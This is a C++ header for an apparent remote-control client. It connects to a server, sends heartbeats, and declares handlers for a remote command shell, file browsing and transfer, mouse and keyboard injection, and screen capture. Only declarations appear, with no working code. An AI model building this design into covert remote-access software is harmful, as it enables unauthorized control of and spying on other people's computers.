#pragma once

#include <iostream>
#include <string>
#include <sstream>
#include "CSocket.h" 
#include "CCriticalSection.h"
#include "Packet.h"

using namespace std;

class CClientWorks
{
public:
	CClientWorks();
	~CClientWorks();
	BOOL StartClient(char *szIpAddr, USHORT sProt);	// 启动客户端
	static DWORD WINAPI HeartThread(LPVOID lpParameter);	// 创建心跳包线程
	void ParserCommand(PACKETHEAD head);	// 解析命令

private:
	void ParserStartCmd();	// 启动CMD
	static DWORD WINAPI CmdWorkThread(LPVOID lpParameter);
	void ParserCmdOrder(PACKETHEAD head);// 匹配到CMD命令

private:
	void ParserGetDrive(); // 获取客户端磁盘驱动
	void ParserGetNextFolder(PACKETHEAD head);	// 获取当前文件的下一层
	void ParserGetPrevFolder(PACKETHEAD head);	// 获取当前文件的上一层
	void ParserDownloadIsFile(PACKETHEAD head);	// 下载的是否是文件
	void ParserBeginDownFile(PACKETHEAD head);	// 开始下载文件
	void ParserUploadFile(PACKETHEAD head);	// 上传文件
	void ParserGetFileData(PACKETHEAD head);	// 获取文件数据
	void ParserSetClientMousePoint(PACKETHEAD head);	// 在指定坐标相应鼠标事件
	void ParserMouseButtonDown(PACKETHEAD head);	// 客户端鼠标左键单击
	void ParserKeyBoardInput(PACKETHEAD head);	 // 键盘输入
private:
	void ParserGetScreenData();	// 获取屏幕数据并将数据发送给服务器

private:
	CTCPSocket m_socket;
	string m_strUploadFilePath; // 保存上传文件的路径
	bool m_QuitFlag;	// 退出标志
	bool m_bCmdRet;
	HANDLE m_hReadOfChild;
	HANDLE m_hWriteOfChild;
	HANDLE m_hReadOfParent;
	HANDLE m_hWriteOfParent;

	CCriticalSection m_cs;	// 临界区，处理同步问题
};